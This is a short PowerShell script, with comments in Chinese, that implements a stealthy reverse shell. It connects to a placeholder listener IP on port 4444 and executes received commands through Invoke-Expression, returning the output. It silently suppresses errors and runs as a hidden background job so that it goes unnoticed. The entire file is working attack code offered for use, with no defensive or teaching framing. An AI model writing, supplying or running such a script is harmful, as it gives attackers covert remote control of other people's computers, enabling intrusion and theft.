# 隐蔽的反向Shell脚本
function Start-StealthReverseShell {
    $server = "YOUR_LISTENER_IP"  # 替换为你的监听IP
    $port = 4444                  # 替换为你的监听端口

    try {
        $client = New-Object System.Net.Sockets.TCPClient($server, $port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | %{0}

        # 发送初始提示符
        $prompt = "PS " + (Get-Location).Path + "> "
        $promptBytes = [Text.Encoding]::ASCII.GetBytes($prompt)
        $stream.Write($promptBytes, 0, $promptBytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = [Text.Encoding]::ASCII.GetString($bytes, 0, $i).Trim()
            
            # 处理退出命令
            if($data -eq "exit") { break }
            
            # 执行命令并获取输出
            $result = (Invoke-Expression $data 2>&1 | Out-String)
            $response = $result + "PS " + (Get-Location).Path + "> "
            $responseBytes = [Text.Encoding]::ASCII.GetBytes($response)
            $stream.Write($responseBytes, 0, $responseBytes.Length)
        }
        $client.Close()
    } catch {
        # 静默处理错误，不输出任何信息
    }
}

# 在后台作业中启动，进一步隐藏进程
Start-Job -ScriptBlock ${function:Start-StealthReverseShell} | Out-Null